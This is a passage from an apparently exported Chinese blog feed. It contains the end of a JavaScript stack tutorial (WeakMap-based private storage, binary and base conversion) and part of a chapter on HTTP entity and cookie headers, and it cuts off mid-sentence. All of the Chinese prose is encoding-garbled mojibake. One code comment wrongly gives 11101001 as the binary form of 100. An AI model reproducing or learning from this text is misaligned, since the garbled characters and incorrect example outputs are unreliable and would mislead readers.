å®žçŽ°ç±»æœ‰ä¸€ç§æ•°æ®ç±»åž‹å¯ç¡®ä¿å±žæ€§æ˜¯ç§æœ‰çš„ï¼Œè¿™å°±æ˜¯ WeakMapã€‚åŽé¢ä¼šæ·±å…¥æŽ¢è®¨ Map è¿™ç§æ•°æ®ç»“æž„ï¼ŒçŽ°åœ¨åªéœ€è¦çŸ¥é“ WeakMap å¯ä»¥å­˜å‚¨é”®å€¼å¯¹ï¼Œå…¶ä¸­é”®æ˜¯å¯¹è±¡ï¼Œå€¼å¯ä»¥æ˜¯ä»»æ„æ•°æ®ç±»åž‹ã€‚ å¦‚æžœä½¿ç”¨ WeakMap æ¥å­˜å‚¨ items å˜é‡ï¼Œé‚£ä¹ˆ Stack ç±»æ˜¯è¿™æ ·çš„ 1234567891011121314151617181920212223242526272829303132333435const items = new WeakMap(); // å£°æ˜Žäº†ä¸€ä¸ª WeakMap ç±»åž‹çš„å˜é‡ itemsclass Stack&#123; constructor()&#123; items.set(this, []) // åœ¨ constructor ä¸­ï¼Œä»¥thisï¼ˆStackç±»è‡ªå·±å¼•ç”¨ï¼‰ä¸ºé”®ï¼ŒæŠŠä»£è¡¨æ ˆçš„æ•°ç»„å­˜å…¥ items &#125; push(element)&#123; let s = items.get(this); s.push(element); &#125; pop ()&#123; let s = items.get(this); let r = s.pop(); return r; &#125; peek ()&#123; let s = items.get(this); return s[s.length-1]; &#125; isEmpty ()&#123; let s = items.get(this); return s.length == 0; &#125; size ()&#123; let s = items.get(this); let r = s.length return r; &#125; clear ()&#123; items.set(this, []) &#125; print ()&#123; let s = items.get(this); console.log(s.toString()); &#125;&#125; çŽ°åœ¨ items åœ¨ Stack ç±»é‡Œæ˜¯çœŸæ­£çš„ç§æœ‰å±žæ€§äº†ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä»¶äº‹è¦åšï¼Œ items çŽ°åœ¨ä»ç„¶æ˜¯åœ¨ Stack ç±»ä»¥å¤–å£°æ˜Žçš„ï¼Œå› æ­¤ä»»ä½•è°éƒ½å¯ä»¥æ”¹åŠ¨å®ƒã€‚æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªé—­åŒ…ï¼ˆå¤–å±‚å‡½æ•°ï¼‰æŠŠ Stack ç±»åŒ…èµ·æ¥ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨è¿™ä¸ªå‡½æ•°é‡Œè®¿é—® WeakMap 12345678910let stack = (function()&#123; const items = new WeakMap(); class Stack &#123; constructor()&#123; items.set(this, []); &#125; // å…¶ä»–æ–¹æ³• &#125; return Stack; // å½“ Stack å‡½æ•°é‡Œçš„æž„é€ å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œä¼šè¿”å›ž Stack ç±»çš„ä¸€ä¸ªå®žä¾‹ã€‚&#125;)() çŽ°åœ¨ï¼ŒStack ç±»æœ‰ä¸€ä¸ªåä¸º items çš„ç§æœ‰å±žæ€§ã€‚ç„¶åŽç”¨è¿™ç§æ–¹æ³•çš„è¯ï¼Œæ‰©å±•ç±»æ— æ³•ç»§æ‰¿å…¶å±žæ€§ã€‚å°†å…¶ä¸Žæœ€å¼€å§‹ç”¨ function å®žçŽ°çš„ Stack ç±»æ¥åšä¸ªæ¯”è¾ƒï¼Œæˆ‘ä»¬ä¼šå‘çŽ°ä¸€äº›ç›¸ä¼¼ä¹‹å¤„ã€‚ äº‹å®žä¸Šï¼Œå°½ç®¡ ES6 å¼•å…¥äº†ç±»çš„è¯­æ³•ï¼Œæˆ‘ä»¬ä»ç„¶ä¸èƒ½åƒåœ¨å…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸­ä¸€æ ·å£°æ˜Žç§æœ‰å±žæ€§æˆ–æ–¹æ³•ã€‚æœ‰å¾ˆå¤šç§æ–¹æ³•éƒ½å¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæžœï¼Œä½†æ— è®ºæ˜¯è¯­æ³•è¿˜æ˜¯æ€§èƒ½ï¼Œè¿™äº›æ–¹æ³•éƒ½æœ‰å„è‡ªçš„ç¼ºç‚¹å’Œä¼˜ç‚¹ã€‚ ç”¨æ ˆè§£å†³é—®é¢˜æ ˆçš„å®žé™…åº”ç”¨éžå¸¸å¹¿æ³›ã€‚åœ¨å›žæº¯é—®é¢˜ä¸­ï¼Œå®ƒå¯ä»¥å­˜å‚¨è®¿é—®è¿‡çš„ä»»åŠ¡æˆ–æ˜¯è·¯å¾„ã€æ’¤é”€çš„æ“ä½œã€‚Java å’Œ C# ç”¨æ ˆæ¥å­˜å‚¨å˜é‡å’Œæ–¹æ³•è°ƒç”¨ï¼Œç‰¹åˆ«æ˜¯å¤„ç†é€’å½’ç®—æ³•æ—¶ï¼Œæœ‰å¯èƒ½æŠ›å‡ºä¸€ä¸ªæ ˆæº¢å‡ºå¼‚å¸¸ï¼ˆstack overflowï¼‰ ä¸‹é¢ï¼Œå­¦ä¹ ä½¿ç”¨æ ˆçš„ä¸‰ä¸ªæœ€è‘—åçš„ç®—æ³•å®žä¾‹ã€‚é¦–å…ˆæ˜¯åè¿›åˆ¶è½¬äºŒè¿›åˆ¶çš„é—®é¢˜ï¼Œä»¥åŠä»»æ„è¿›åˆ¶è½¬æ¢çš„ç®—æ³•ï¼Œç„¶åŽæ˜¯å¹³è¡¡åœ†æ‹¬å·é—®é¢˜ï¼Œæœ€åŽï¼Œä¼šå­¦ä¹ æ ˆè§£å†³æ±‰è¯ºå¡”çš„é—®é¢˜ã€‚ ä»Žåè¿›åˆ¶åˆ°äºŒè¿›åˆ¶è®¡ç®—ç§‘å­¦ä¸­ï¼ŒäºŒè¿›åˆ¶éžå¸¸é‡è¦ï¼Œå› ä¸ºè®¡ç®—æœºé‡Œçš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯ç”¨äºŒè¿›åˆ¶æ•°å­—è¡¨ç¤ºï¼ˆ0å’Œ1ï¼‰ã€‚æ²¡æœ‰åè¿›åˆ¶å’ŒäºŒè¿›åˆ¶ç›¸äº’è½¬åŒ–çš„èƒ½åŠ›ï¼Œä¸Žè®¡ç®—æœºäº¤æµå°±å¾ˆå›°éš¾ã€‚è¦æŠŠåè¿›åˆ¶åŒ–æˆåè¿›åˆ¶ï¼Œå°†è¯¥åè¿›åˆ¶æ•°å­—å’Œ2æ•´é™¤ï¼Œç›´åˆ°ç»“æžœä¸º0ä¸ºæ­¢ã€‚ å®žä¾‹:æ•°å­—10è½¬ä¸ºäºŒè¿›åˆ¶çš„æ•°å­—ã€‚ 123456789101112131415161718function divideBy2(decNumber)&#123; var remStack = new Stack(), rem, binaryString = ''; while(decNumber &gt; 0)&#123; rem = Math.floor(decNumber % 2); // æ‹¿åˆ°è¢«2æ•´é™¤çš„ä½™æ•° remStack.push(rem); decNumber = Math.floor(decNumber / 2) // æ‹¿åˆ°è¢«2æ•´é™¤çš„æ•´æ•° &#125; while (! remStack.isEmpty())&#123; binaryString += remStack.pop().toString(); &#125; return binaryString;&#125;console.log(divideBy2(10)); // 1010console.log(divideBy2(233)); // 11101001console.log(divideBy2(100)); // 11101001 JavaScriptæœ‰æ•°å­—ç±»åž‹ï¼Œä½†æ˜¯ä¸ä¼šåŒºåˆ†ç©¶ç«Ÿæ˜¯æ•´æ•°è¿˜æ˜¯æµ®ç‚¹æ•°ï¼Œä½¿ç”¨ Math.floor è®©é™¤æ³•åªè¿”å›žæ•´æ•°éƒ¨åˆ†ã€‚ è¿›åˆ¶è½¬æ¢ç®—æ³•å¯ä»¥ä¼ å…¥ä»»æ„è¿›åˆ¶çš„åŸºæ•°ä½œä¸ºå‚æ•° 123456789101112131415161718function baseConverter(decNumber, base)&#123; var remStack = new Stack(), rem, baseString = '', digits = '0123456789ABCDEF'; while(decNumber &gt; 0)&#123; rem = Math.floor(decNumber % base); // æ‹¿åˆ°è¢«baseæ•´é™¤çš„ä½™æ•° remStack.push(rem); decNumber = Math.floor(decNumber / base) // æ‹¿åˆ°è¢«baseæ•´é™¤çš„æ•´æ•° &#125; while (! remStack.isEmpty())&#123; baseString += digits[remStack.pop()]; &#125; return baseString;&#125;console.log(baseConverter(100345,2)); // 11000011111111001console.log(baseConverter(100345, 8)); // 303771console.log(baseConverter(100345, 16)); // 187F9 éœ€è¦æ”¹åŠ¨çš„åœ°æ–¹ï¼šåœ¨å°†åè¿›åˆ¶è½¬ä¸ºäºŒè¿›åˆ¶çš„æ—¶å€™ï¼Œä½™æ•°æ˜¯0æˆ–è€…1ï¼Œè½¬ä¸ºå…«è¿›åˆ¶çš„æ—¶å€™ï¼Œä½™æ•°ä¸º0~7ï¼ŒåŒç†16è¿›åˆ¶æ˜¯0~9åŠ ä¸ŠA~Fã€‚æ‰€ä»¥è¦åšä¸ªè½¬æ¢ï¼Œé€šè¿‡å®šä¹‰ digits ï¼Œdigits[remStack.pop()] æ¥å®žçŽ°è½¬åŒ–ã€‚ å°ç»“é€šè¿‡è¿™ä¸€ç« ï¼Œå­¦ä¹ äº†æ ˆè¿™ä¸€æ•°æ®ç»“æž„çš„ç›¸å…³å†…å®¹ã€‚å¯ä»¥ç”¨ä»£ç è‡ªå·±å®žçŽ°æ ˆï¼Œè¿˜è®²è§£äº†æ ˆé‡Œé¢çš„ç›¸å…³æ–¹æ³•ã€‚ ä¹¦ç±é“¾æŽ¥ï¼š å­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬å…­ç« ä¸‹ï¼‰â€”â€” HTTP é¦–éƒ¨]]></title>
    <url>%2F2018-08-23-read-%E5%9B%BE%E8%A7%A3HTTP-Part6%E4%B8%8B.html</url>
    <content type="text"><![CDATA[ç»§ç»­å®Œæˆ HTTP é¦–éƒ¨çš„æœ€åŽä¸€å°éƒ¨åˆ†ã€‚ ç¬¬å…­ç«  HTTP é¦–éƒ¨ï¼ˆä¸‹ï¼‰å®žä½“é¦–éƒ¨å­—æ®µå®žä½“é¦–éƒ¨å­—æ®µæ˜¯åŒ…å«åœ¨è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡ä¸­çš„å®žä½“éƒ¨åˆ†æ‰€ä½¿ç”¨çš„é¦–éƒ¨ï¼Œç”¨äºŽè¡¥å……å†…å®¹çš„æ›´æ–°æ—¶é—´ç­‰äºŽå®žä½“ç›¸å…³çš„æ¶ˆæ¯ã€‚ Allow 1Allow: GET, HEAD é¦–éƒ¨å­—æ®µ Allow ç”¨äºŽé€šçŸ¥å®¢æˆ·ç«¯èƒ½å¤Ÿæ”¯æŒ Request-URI æŒ‡å®šèµ„æºçš„çš„æ‰€æœ‰ HTTP æ–¹æ³•ã€‚å½“æœåŠ¡å™¨æŽ¥æ”¶ä¸åˆ°ä¸æ”¯æŒçš„ HTTP æ–¹æ³•æ—¶ï¼Œä¼šä»¥çŠ¶æ€ç  405 Method Allowed ä½œä¸ºå“åº”è¿”å›žã€‚ä¸Žæ­¤åŒæ—¶ï¼Œè¿˜ä¼šæŠŠæ‰€æœ‰èƒ½æ”¯æŒçš„ HTTP æ–¹æ³•å†™å…¥é¦–éƒ¨å­—æ®µ Allow åŽè¿”å›žã€‚ Content-Encoding1Content-Encoding: gzip é¦–éƒ¨å­—æ®µ Content-Encoding ä¼šå‘ŠçŸ¥å®¢æˆ·ç«¯æœåŠ¡å™¨å¯¹å®žä½“çš„ä¸»ä½“éƒ¨åˆ†é€‰ç”¨çš„å†…å®¹ç¼–ç æ–¹å¼ã€‚å†…å®¹ç¼–ç æ˜¯æŒ‡åœ¨ä¸ä¸¢å¤±å®žä½“æ¶ˆæ¯çš„å‰æä¸‹æ‰€è¿›è¡Œçš„åŽ‹ç¼©ã€‚ ä¸»è¦é‡‡ç”¨ä»¥ä¸‹4ç§å†…å®¹ç¼–ç çš„å†…å®¹ã€‚ gzip compress deflate identity Content-Language1Content-Language: zh-CN é¦–éƒ¨å­—æ®µ Content-Language ä¼šå‘ŠçŸ¥å®¢æˆ·ç«¯ï¼Œå®žä½“ä¸»ä½“ä½¿ç”¨çš„è‡ªç„¶è¯­è¨€ï¼ˆæŒ‡ä¸­æ–‡æˆ–è€…è‹±æ–‡ç­‰è¯­è¨€ï¼‰ã€‚ Content-Location1Content-Location: http://www.hackr.jp/index-ja.html Content-MD5 å›¾ï¼šå®¢æˆ·ç«¯ä¼šå¯¹æŽ¥æ”¶çš„æŠ¥æ–‡ä¸»ä½“æ‰§è¡Œç›¸åŒçš„ MD5 ç®—æ³•ï¼Œç„¶åŽä¸Žé¦–éƒ¨å­—æ®µ Content-MD5 çš„å­—æ®µå€¼æ¯”è¾ƒ 1Content-MD5: OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY== é¦–éƒ¨å­—æ®µ Content-MD5 æ˜¯ä¸€ä¸²ç”± MD5 ç®—æ³•ç”Ÿæˆçš„å€¼ï¼Œå…¶ç›®çš„åœ¨äºŽæ£€æŸ¥æŠ¥æ–‡åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦ä¿æŒå®Œæ•´ï¼Œä»¥åŠç¡®è®¤ä¼ è¾“åˆ°è¾¾ã€‚ å¯¹æŠ¥æ–‡ä¸»ä½“æ‰§è¡Œ MD5 ç®—æ³•èŽ·å¾— 128 ä½äºŒè¿›åˆ¶æ•°ï¼Œå†é€šè¿‡ Base64 ç¼–ç åŽå°†ç»“æžœå†™å…¥ Content-MD5 å­—æ®µå€¼ï¼Œç”±äºŽ HTTP é¦–éƒ¨æ— æ³•è®°å½•äºŒè¿›åˆ¶ï¼Œæ‰€ä»¥è¦é€šè¿‡ Base64 ç¼–ç å¤„ç†ã€‚ä¸ºç¡®ä¿æŠ¥æ–‡çš„æœ‰æ•ˆæ€§ï¼Œä½œä¸ºæŽ¥æ”¶æ–¹çš„å®¢æˆ·ç«¯ä¼šå¯¹æŠ¥æ–‡ä¸»ä½“å†æ‰§è¡Œä¸€æ¬¡ç›¸åŒçš„MD5 ç®—æ³•ã€‚è®¡ç®—å‡ºçš„å€¼ä¸Žå­—æ®µå€¼ä½œæ¯”è¾ƒåŽï¼Œå³å¯åˆ¤æ–­å‡ºæŠ¥æ–‡ä¸»ä½“çš„å‡†ç¡®æ€§ã€‚ é‡‡ç”¨è¿™ç§æ–¹æ³•ï¼Œå¯¹å†…å®¹ä¸Šçš„å¶å‘æ€§æ”¹å˜æ˜¯æ— ä»ŽæŸ¥è¯çš„ï¼Œä¹Ÿæ— æ³•æ£€æµ‹å‡ºæ¶æ„ç¯¡æ”¹ã€‚å…¶ä¸­ä¸€ä¸ªåŽŸå› åœ¨äºŽï¼Œå†…å®¹å¦‚æžœèƒ½å¤Ÿè¢«ç¯¡æ”¹ï¼Œé‚£ä¹ˆåŒæ—¶æ„å‘³ç€ Content-MD5 ä¹Ÿå¯é‡æ–°è®¡ç®—ç„¶åŽè¢«ç¯¡æ”¹ã€‚æ‰€ä»¥å¤„åœ¨æŽ¥æ”¶é˜¶æ®µçš„å®¢æˆ·ç«¯æ˜¯æ— æ³•æ„è¯†åˆ°æŠ¥æ–‡ä¸»ä½“ä»¥åŠé¦–éƒ¨å­—æ®µ Content-MD5 æ˜¯å·²ç»è¢«ç¯¡æ”¹è¿‡çš„ã€‚ Content-Range 1Content-Range: bytes 5001-10000/10000 é’ˆå¯¹èŒƒå›´è¯·æ±‚ï¼Œè¿”å›žå“åº”æ—¶ä½¿ç”¨çš„é¦–éƒ¨å­—æ®µ Content-Range ï¼Œèƒ½å‘ŠçŸ¥å®¢æˆ·ç«¯ä½œä¸ºå“åº”è¿”å›žçš„å®žä½“çš„å“ªä¸ªéƒ¨åˆ†ç¬¦åˆèŒƒå›´è¯·æ±‚ã€‚å­—æ®µå€¼ä»¥å­—èŠ‚ä¸ºå•ä½ï¼Œè¡¨ç¤ºå½“å‰å‘é€éƒ¨åˆ†åŠæ•´ä¸ªå®žä½“å¤§å°ã€‚ Content-Type1Content-Type: text/html; charset=UTF-8 é¦–éƒ¨å­—æ®µ Content-Type è¯´æ˜Žäº†å®žä½“ä¸»ä½“å†…å¯¹è±¡çš„åª’ä½“ç±»åž‹ã€‚å’Œé¦–éƒ¨å­—æ®µ Accept ä¸€æ ·ï¼Œå­—æ®µå€¼ç”¨ type/subtype å½¢å¼èµ‹å€¼ã€‚ å‚æ•° charset ä½¿ç”¨ iso-8859-1 æˆ– euc-jp ç­‰å­—ç¬¦é›†è¿›è¡Œèµ‹å€¼ã€‚ Expires1Expires: Wed, 04 Jul 2012 08:26:05 GMT é¦–éƒ¨å­—æ®µ Expires ä¼šå°†èµ„æºå¤±æ•ˆçš„æ—¥æœŸå‘ŠçŸ¥å®¢æˆ·ç«¯ã€‚ç¼“å­˜æœåŠ¡å™¨åœ¨æŽ¥æ”¶åˆ°å«æœ‰é¦–éƒ¨å­—æ®µ Expires çš„å“åº”åŽï¼Œä¼šä»¥ç¼“å­˜æ¥åº”ç­”è¯·æ±‚ï¼Œåœ¨Expires å­—æ®µå€¼æŒ‡å®šçš„æ—¶é—´ä¹‹å‰ï¼Œå“åº”çš„å‰¯æœ¬ä¼šä¸€ç›´è¢«ä¿å­˜ã€‚å½“è¶…è¿‡æŒ‡å®šçš„æ—¶é—´åŽï¼Œç¼“å­˜æœåŠ¡å™¨åœ¨è¯·æ±‚å‘é€è¿‡æ¥æ—¶ï¼Œä¼šè½¬å‘æºæœåŠ¡å™¨è¯·æ±‚èµ„æºã€‚ æºæœåŠ¡å™¨ä¸å¸Œæœ›ç¼“å­˜æœåŠ¡å™¨å¯¹èµ„æºç¼“å­˜æ—¶ï¼Œæœ€å¥½åœ¨ Expires å­—æ®µå†…å†™å…¥ä¸Žé¦–éƒ¨å­—æ®µ Date ç›¸åŒçš„æ—¶é—´å€¼ã€‚ ä½†æ˜¯ï¼Œå½“é¦–éƒ¨å­—æ®µ Cache-Control æœ‰æŒ‡å®š max-age æŒ‡ä»¤æ—¶ï¼Œæ¯”èµ·é¦–éƒ¨å­—æ®µ Expires ï¼Œä¼šä¼˜å…ˆå¤„ç† max-age æŒ‡ä»¤ã€‚ Last-Modified1Last-Modified: Wed, 23 May 2012 09:59:55 GMT é¦–éƒ¨å­—æ®µ Last-Modified æŒ‡æ˜Žèµ„æºæœ€ç»ˆä¿®æ”¹çš„æ—¶é—´ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªå€¼å°±æ˜¯ Request-URI æŒ‡å®šèµ„æºè¢«ä¿®æ”¹çš„æ—¶é—´ã€‚ä½†ç±»ä¼¼ä½¿ç”¨ CGI è„šæœ¬è¿›è¡ŒåŠ¨æ€æ•°æ®å¤„ç†æ—¶ï¼Œè¯¥å€¼æœ‰å¯èƒ½ä¼šè¢«å˜æˆæ•°æ®æœ€ç»ˆä¿®æ”¹æ—¶çš„æ—¶é—´ã€‚ ä¸º Cookie æœåŠ¡çš„é¦–éƒ¨å­—æ®µç®¡ç†æœåŠ¡å™¨ä¸Žå®¢æˆ·ç«¯ä¹‹é—´çŠ¶æ€çš„ Cookieï¼Œè™½ç„¶æ²¡æœ‰è¢«ç¼–å…¥æ ‡å‡†åŒ–HTTP/1.1 çš„ RFC2616 ä¸­ï¼Œä½†åœ¨ Web ç½‘ç«™æ–¹é¢å¾—åˆ°äº†å¹¿æ³›çš„åº”ç”¨ã€‚Cookie çš„å·¥ä½œæœºåˆ¶æ˜¯ç”¨æˆ·è¯†åˆ«åŠçŠ¶æ€ç®¡ç†ã€‚Web ç½‘ç«™ä¸ºäº†ç®¡ç†ç”¨æˆ·çš„çŠ¶æ€ä¼šé€šè¿‡ Web æµè§ˆå™¨ï¼ŒæŠŠä¸€äº›æ•°æ®ä¸´æ—¶å†™å…¥ç”¨æˆ·çš„è®¡ç®—æœºå†…ã€‚æŽ¥ç€å½“ç”¨æˆ·è®¿é—®è¯¥Webç½‘ç«™æ—¶ï¼Œå¯é€šè¿‡é€šä¿¡æ–¹å¼å–å›žä¹‹å‰å‘æ”¾Cookieã€‚è°ƒç”¨ Cookie æ—¶ï¼Œç”±äºŽå¯æ ¡éªŒ Cookie çš„æœ‰æ•ˆæœŸï¼Œä»¥åŠå‘é€æ–¹çš„åŸŸã€è·¯å¾„ã€åè®®ç­‰ä¿¡æ¯ï¼Œæ‰€ä»¥æ­£è§„å‘å¸ƒçš„ Cookie å†…çš„æ•°æ®ä¸ä¼šå› æ¥è‡ªå…¶ä»–Web ç«™ç‚¹å’Œæ”»å‡»è€…çš„æ”»å‡»è€Œæ³„éœ²ã€‚ è‡³ 2013 å¹´ 5 æœˆï¼ŒCookie çš„è§„æ ¼æ ‡å‡†æ–‡æ¡£æœ‰ä»¥ä¸‹ 4 ç§ã€‚ç”±ç½‘æ™¯å…¬å¸é¢å¸ƒçš„è§„æ ¼æ ‡å‡†ç½‘æ™¯é€šä¿¡å…¬å¸è®¾è®¡å¹¶å¼€å‘äº† Cookieï¼Œå¹¶åˆ¶å®šç›¸å…³çš„è§„æ ¼æ ‡å‡†ã€‚1994å¹´å‰åŽï¼ŒCookie æ­£å¼åº”ç”¨åœ¨ç½‘æ™¯æµè§ˆå™¨ä¸­ã€‚ç›®å‰æœ€ä¸ºæ™®åŠçš„ Cookieæ–¹å¼ä¹Ÿæ˜¯ä»¥æ­¤ä¸ºåŸºå‡†çš„ã€‚ RFC2109æŸä¼ä¸šå°è¯•ä»¥ç‹¬ç«‹æŠ€æœ¯å¯¹ Cookie è§„æ ¼è¿›è¡Œæ ‡å‡†åŒ–ç»Ÿç­¹ã€‚åŽŸæœ¬çš„æ„å›¾æ˜¯æƒ³å’Œç½‘æ™¯å…¬å¸åˆ¶å®šçš„æ ‡å‡†äº¤äº’åº”ç”¨ï¼Œå¯æƒœå‘ç”Ÿäº†å¾®å¦™çš„å·®å¼‚ã€‚çŽ°åœ¨è¯¥æ ‡å‡†å·²æ·¡å‡ºäº†äººä»¬çš„è§†çº¿ã€‚ RFC2965ä¸ºç»ˆç»“ Internet Explorer æµè§ˆå™¨ä¸Ž Netscape Navigator çš„æ ‡å‡†å·®å¼‚è€Œå¯¼è‡´çš„æµè§ˆå™¨æˆ˜äº‰ï¼ŒRFC2965 å†…å®šä¹‰äº†æ–°çš„ HTTP é¦–éƒ¨ Set-Cookie2 å’ŒCookie2ã€‚å¯äº‹å®žä¸Šï¼Œå®ƒä»¬å‡ ä¹Žæ²¡æ€Žä¹ˆæŠ•å…¥ä½¿ç”¨ã€‚ RFC6265å°†ç½‘æ™¯å…¬å¸åˆ¶å®šçš„æ ‡å‡†ä½œä¸ºä¸šç•Œäº‹å®žæ ‡å‡†ï¼ˆDe facto standardï¼‰ï¼Œé‡æ–°å®šä¹‰ Cookie æ ‡å‡†åŽçš„äº§ç‰©ã€‚ç›®å‰ä½¿ç”¨æœ€å¹¿æ³›çš„ Cookie æ ‡å‡†å´ä¸æ˜¯ RFC ä¸­å®šä¹‰çš„ä»»ä½•ä¸€ä¸ªã€‚è€Œæ˜¯åœ¨ç½‘æ™¯å…¬å¸åˆ¶å®šçš„æ ‡å‡†ä¸Šè¿›è¡Œæ‰©å±•åŽçš„äº§ç‰©ã€‚æœ¬èŠ‚æŽ¥ä¸‹æ¥å°±å¯¹ç›®å‰ä½¿ç”¨æœ€ä¸ºå¹¿æ³›æ™®åŠçš„æ ‡å‡†è¿›è¡Œè¯´æ˜Žã€‚ä¸‹é¢çš„è¡¨æ ¼å†…åˆ—ä¸¾äº†ä¸Ž Cookie æœ‰å…³çš„é¦–éƒ¨å­—æ®µã€‚ é¦–éƒ¨å­—æ®µå è¯´æ˜Ž é¦–éƒ¨ç±»åž‹ Set-Cookie å¼€å§‹çŠ¶æ€ç®¡ç†æ‰€ä½¿ç”¨çš„ Cookie æ¶ˆæ¯ å“åº”é¦–éƒ¨å­—æ®µ Cookie æœåŠ¡å™¨æŽ¥æ”¶åˆ°çš„ Cookie ä¿¡æ¯ è¯·æ±‚é¦–éƒ¨å­—æ®µ Set-Cookie1Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; å½“æœåŠ¡å™¨å‡†å¤‡å¼€å§‹ç®¡ç†å®¢æˆ·ç«¯çš„çŠ¶æ€æ—¶ï¼Œä¼šäº‹å…ˆå‘ŠçŸ¥å„ç§ä¿¡æ¯ã€‚ ä¸‹é¢çš„è¡¨æ ¼åˆ—ä¸¾äº† Set-Cookie çš„å­—æ®µå€¼ã€‚ å±žæ€§ è¯´æ˜Ž NAME=VALUE èµ‹äºˆ Cookie çš„åç§°å’Œå…¶å€¼ï¼ˆå¿…éœ€é¡¹ï¼‰ expires=DATE Cookie çš„æœ‰æ•ˆæœŸï¼ˆè‹¥ä¸æ˜Žç¡®æŒ‡å®šåˆ™é»˜è®¤ä¸ºæµè§ˆå™¨å…³é—­å‰ä¸ºæ­¢ï¼‰ path=PATH å°†æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ç›®å½•ä½œä¸ºCookieçš„é€‚ç”¨å¯¹è±¡ï¼ˆè‹¥ä¸æŒ‡å®šåˆ™é»˜è®¤ä¸ºæ–‡æ¡£æ‰€åœ¨çš„æ–‡ä»¶ç›®å½•ï¼‰ domain=åŸŸå ä½œä¸º Cookie é€‚ç”¨å¯¹è±¡çš„åŸŸå ï¼ˆè‹¥ä¸æŒ‡å®šåˆ™é»˜è®¤ä¸ºåˆ›å»º Cookieçš„æœåŠ¡å™¨çš„åŸŸåï¼‰ Secure ä»…åœ¨ HTTPS å®‰å…¨é€šä¿¡æ—¶æ‰ä¼šå‘é€ Cookie HttpOnly åŠ ä»¥é™åˆ¶ï¼Œä½¿ Cookie ä¸èƒ½è¢« JavaScript è„šæœ¬è®¿é—® expires å±žæ€§Cookie çš„ expires å±žæ€§æŒ‡å®šæµè§ˆå™¨å¯å‘é€ Cookie çš„æœ‰æ•ˆæœŸã€‚å½“çœç•¥ expires å±žæ€§æ—¶ï¼Œå…¶æœ‰æ•ˆæœŸä»…é™äºŽç»´æŒæµè§ˆå™¨ä¼šè¯ï¼ˆSessionï¼‰æ—¶é—´æ®µå†…ã€‚è¿™é€šå¸¸é™äºŽæµè§ˆå™¨åº”ç”¨ç¨‹åºè¢«å…³é—­ä¹‹å‰ã€‚ å¦å¤–ï¼Œä¸€æ—¦ Cookie ä»ŽæœåŠ¡å™¨ç«¯å‘é€è‡³å®¢æˆ·ç«¯ï¼ŒæœåŠ¡å™¨ç«¯å°±ä¸å­˜åœ¨å¯ä»¥æ˜¾å¼åˆ é™¤ Cookie çš„æ–¹æ³•ã€‚ä½†å¯é€šè¿‡è¦†ç›–å·²è¿‡æœŸçš„ Cookieï¼Œå®žçŽ°å¯¹å®¢æˆ·ç«¯ Cookie çš„å®žè´¨æ€§åˆ é™¤æ“ä½œã€‚ path å±žæ€§Cookie çš„ path å±žæ€§å¯ç”¨äºŽé™åˆ¶æŒ‡å®š Cookie çš„å‘é€èŒƒå›´çš„æ–‡ä»¶ç›®å½•ã€‚ä¸è¿‡å¦æœ‰åŠžæ³•å¯é¿å¼€è¿™é¡¹é™åˆ¶ï¼Œçœ‹æ¥å¯¹å…¶ä½œä¸ºå®‰å…¨æœºåˆ¶çš„æ•ˆæžœä¸èƒ½æŠ±æœ‰æœŸå¾…ã€‚ domain å±žæ€§é€šè¿‡ Cookie çš„ domain å±žæ€§æŒ‡å®šçš„åŸŸåå¯åšåˆ°ä¸Žç»“å°¾åŒ¹é…ä¸€è‡´ã€‚æ¯”å¦‚ï¼Œå½“æŒ‡å®š example.com åŽï¼Œé™¤ example.com ä»¥å¤–ï¼Œwww.example.comæˆ– www2.example.com ç­‰éƒ½å¯ä»¥å‘é€ Cookieã€‚ å› æ­¤ï¼Œé™¤äº†é’ˆå¯¹å…·ä½“æŒ‡å®šçš„å¤šä¸ªåŸŸåå‘é€ Cookie ä¹‹ å¤–ï¼Œä¸æŒ‡å®šdomain å±žæ€§æ˜¾å¾—æ›´å®‰å…¨ã€‚ secure å±žæ€§Cookie çš„ secure å±žæ€§ç”¨äºŽé™åˆ¶ Web é¡µé¢ä»…åœ¨ HTTPS å®‰å…¨è¿žæŽ¥æ—¶ï¼Œæ‰å¯ä»¥å‘é€ Cookieã€‚ å‘é€ Cookie æ—¶ï¼ŒæŒ‡å®š secure å±žæ€§çš„æ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºã€‚ 1Set-Cookie: name=value; secure ä»¥ä¸Šä¾‹å­ä»…å½“åœ¨ https://www.example.com/ï¼ˆHTTPSï¼‰å®‰å…¨è¿žæŽ¥çš„æƒ…å†µä¸‹æ‰ä¼šè¿›è¡Œ Cookie çš„å›žæ”¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿åŸŸåç›¸åŒï¼Œhttp://www.example.com/ï¼ˆHTTPï¼‰ä¹Ÿä¸ä¼šå‘ç”Ÿ Cookie å›žæ”¶è¡Œä¸ºã€‚å½“çœç•¥ secure å±žæ€§æ—¶ï¼Œä¸è®º HTTP è¿˜æ˜¯ HTTPSï¼Œéƒ½ä¼šå¯¹ Cookie è¿›è¡Œå›žæ”¶ã€‚ HttpOnly å±žæ€§Cookie çš„ HttpOnly å±žæ€§æ˜¯ Cookie çš„æ‰©å±•åŠŸèƒ½ï¼Œå®ƒä½¿ JavaScript è„šæœ¬æ— æ³•èŽ·å¾— 